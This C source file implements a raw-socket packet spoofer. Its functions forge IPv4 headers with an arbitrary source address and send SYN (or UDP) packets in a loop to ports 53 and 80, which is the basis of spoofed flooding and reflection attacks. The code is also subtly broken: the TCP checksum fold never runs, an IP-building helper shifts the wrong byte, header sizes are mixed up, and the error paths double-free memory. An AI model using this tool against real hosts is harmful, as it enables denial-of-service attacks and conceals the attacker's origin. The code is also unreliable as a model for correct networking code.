#include <stdint.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <netdb.h>

#include "include/spoofer.h"
#include "include/dnsutils.h"


int send_packet( uint32_t src, uint32_t dest, uint8_t ttl_high, uint8_t ttl_low, const char* data, uint16_t len_data );
int send_udp_packet( uint32_t src, uint32_t dest, uint8_t ttl_high, uint8_t ttl_low, const char* data, uint16_t len_data );

void* spawn_spoofer( void* args ) {
	struct spoofer_in* in = (struct spoofer_in*)( args );
	int i;
	struct in_addr tmp;
	inet_aton( in->dest, &tmp );
	uint32_t dest = ntohl( tmp.s_addr );
	inet_aton( in->src, &tmp );
	uint32_t src = ntohl( tmp.s_addr );

	const char* message = "";
	uint16_t len = strlen( message );
	for( i = 0; i < in->n_packets; i++ ) {
		//send_udp_packet( src, dest, in->ttl_high, in->ttl_low, message, len );
		send_packet( src, dest, in->ttl_high, in->ttl_low, message, len );
	}
	return NULL;
}

uint8_t* build_ip_header( uint32_t src, uint32_t dest, uint8_t ttl, uint16_t len ) {
	uint8_t* bheader = calloc( IP_HEADER_BYTES, sizeof( *bheader ) );
	uint16_t* sheader = (uint16_t*) bheader;
	uint32_t* lheader = (uint32_t*) bheader;
	bheader[0] = 0x5 + (0x4 << 4 );

	sheader[1] = htons( len + TCP_HEADER_BYTES );
	//Identification, flags, and fragment offset are 0
	bheader[8] = ttl;
	//bheader[9] = TCP_PROTOCOL;
	bheader[9] = UDP_PROTOCOL;
	lheader[3] = htonl(src);
	lheader[4] = htonl(dest);

	//Calculate checksum as complemented sum of complemented 16 byte segments
	uint32_t sum = 0;
	for( int i = 0; i < IP_HEADER_BYTES/2; i++ ) {
		sum += ~(sheader[i]);
	}
	while( sum > 0xffff ) {
		sum = (sum & 0xffff ) + (sum >> 16);
	}
	sheader[5] = ~((uint16_t)sum);

	return bheader;
}

uint8_t* build_tcp_header( const char* data, uint16_t len ) {
	uint8_t* bheader = calloc( TCP_HEADER_BYTES, sizeof( *bheader ) );
	uint16_t* sheader = (uint16_t*) bheader;
	uint32_t* lheader = (uint32_t*) bheader;

	sheader[0] = htons( 0xfff + (rand( ) % 0xf0000 ) ); //source port, random
	sheader[1] = htons ( 53 );     // destination port for http traffic
	lheader[1] = htonl( rand() % 0x7fff );
	lheader[2] = 0; //acknowledgement number is 0
	bheader[12] = (TCP_HEADER_BYTES/4) << 4; //data offset is the smallest tcp size
	bheader[13] |= 0x2; //set the SYN bit

	//TODO checksum

	return bheader;
}

uint8_t* build_udp_header( uint16_t len ) {
	uint16_t* sheader = calloc( UDP_HEADER_BYTES, sizeof( *sheader ) );
	sheader[0] = htons( 0xfff + ( rand() % 0xf000 ) );
	sheader[1] = htons( 53 );
	sheader[2] = htons( len + UDP_HEADER_BYTES );
	sheader[3] = 0; //optional checksum
	print_header( (uint8_t*)sheader, UDP_HEADER_BYTES );
	return (uint8_t*)sheader;
}

int send_udp_packet( uint32_t src, uint32_t dest, uint8_t ttl_high, uint8_t ttl_low, const char* data, uint16_t len_data ) {
	uint8_t ttl = rand() % ( ttl_high - ttl_low + 1 ) + ttl_low;
	uint8_t* ip_header = build_ip_header( src, dest, ttl, len_data );
	uint8_t* udp_header = build_udp_header( len_data );

	int fd = socket( PF_INET, SOCK_RAW, IPPROTO_RAW );

	int on = 1;
	int err = setsockopt( fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof( on ) );
	if( err == -1 ) {
		printf( "setsockopt() error: %s\n", strerror( errno ) );
		goto fail1;
	}
	const struct in_addr in = {
		ntohl( dest ),
	};

	const struct sockaddr_in res = {
		AF_INET,
		53,
		in,
	};
	int message_len = IP_HEADER_BYTES + TCP_HEADER_BYTES + len_data;
	char* message = calloc( message_len, sizeof( *message ) );
	// TODO: memcpy to message
	memcpy( message, ip_header, IP_HEADER_BYTES );
	memcpy( message+IP_HEADER_BYTES, udp_header, TCP_HEADER_BYTES );
	memcpy( message+IP_HEADER_BYTES+UDP_HEADER_BYTES, data, strlen(data) );
	free( ip_header );
	free( udp_header );

	int bytes = sendto( fd, message, message_len, 0, (const struct sockaddr*) &res, sizeof( res ) );
	if( bytes == -1 ) {
		printf( "sendto() error: %s\n", strerror( errno ) );
		goto fail2;
	}
	free( message );
	return 0;

fail2:
	free( message );

fail1:
	free( ip_header );
	free( udp_header );
	return -1;


}

int send_packet( uint32_t src, uint32_t dest, uint8_t ttl_high, uint8_t ttl_low, const char* data, uint16_t len_data ) {
	uint8_t ttl = rand() % ( ttl_high - ttl_low + 1 ) + ttl_low;
	uint8_t* ip_header = build_ip_header( src, dest, ttl, len_data );
	uint8_t* tcp_header = build_tcp_header( data, len_data );

	// Fill tcp checksum
	uint8_t bpseudo_header[12];
	memset( bpseudo_header, 0, 12 );
	uint16_t* spseudo_header = (uint16_t*)bpseudo_header;
	uint32_t* lpseudo_header = (uint32_t*)bpseudo_header;
	lpseudo_header[0] = htonl( src );
	lpseudo_header[1] = htonl( dest );
	bpseudo_header[8] = 0;
	bpseudo_header[9] = TCP_PROTOCOL;
	spseudo_header[5] = htons( len_data + TCP_HEADER_BYTES);
	print_header( bpseudo_header, 12 );
	printf( "-------\n");
	print_header( tcp_header, TCP_HEADER_BYTES );
	printf( "\n" );

	uint16_t sum = 0xD;
	for( int i = 0; i < 6; i++ ) {
		sum += ~(spseudo_header[i]);
	}
	for( int i = 0; i < TCP_HEADER_BYTES/2; i++ ) {
		sum += ~(((uint16_t*)(tcp_header))[i]);
	}
	while( sum > 0xffff ) {
		sum = (sum & 0xffff ) + (sum >> 16);
	}
	((uint16_t*)tcp_header)[8] = sum;

	int fd = socket( PF_INET, SOCK_RAW, IPPROTO_RAW );
	if( fd == -1 ) {
		printf( "socket() error: %s\n", strerror( errno ) );
		goto fail1;
	}

	int on = 1;
	int err = setsockopt( fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof( on ) );
	if( err == -1 ) {
		printf( "setsockopt() error: %s\n", strerror( errno ) );
		goto fail1;
	}
	const struct in_addr in = {
		ntohl( dest ),
	};

	const struct sockaddr_in res = {
		AF_INET,
		80,
		in,
	};
	int message_len = IP_HEADER_BYTES + TCP_HEADER_BYTES + len_data;
	char* message = calloc( message_len, sizeof( *message ) );
	// TODO: memcpy to message
	memcpy( message, ip_header, IP_HEADER_BYTES );
	memcpy( message+IP_HEADER_BYTES, tcp_header, TCP_HEADER_BYTES );
	memcpy( message+IP_HEADER_BYTES+TCP_HEADER_BYTES, data, strlen(data) );
	free( ip_header );
	free( tcp_header );


	int bytes = sendto( fd, message, message_len, 0, (const struct sockaddr*) &res, sizeof( res ) );
	if( bytes == -1 ) {
		printf( "sendto() error: %s\n", strerror( errno ) );
		goto fail2;
	}
	free( message );
	return 0;

fail2:
	free( message );

fail1:
	free( ip_header );
	free( tcp_header );
	return -1;
}

uint32_t ip_from_comp( uint8_t c0, uint8_t c1, uint8_t c2, uint8_t c3 ) {
	uint32_t ret = 0;
	ret = (c0 << 24) + (c1 << 16) + (c2 << 8) + (c3 << 8);
	return ret;
}
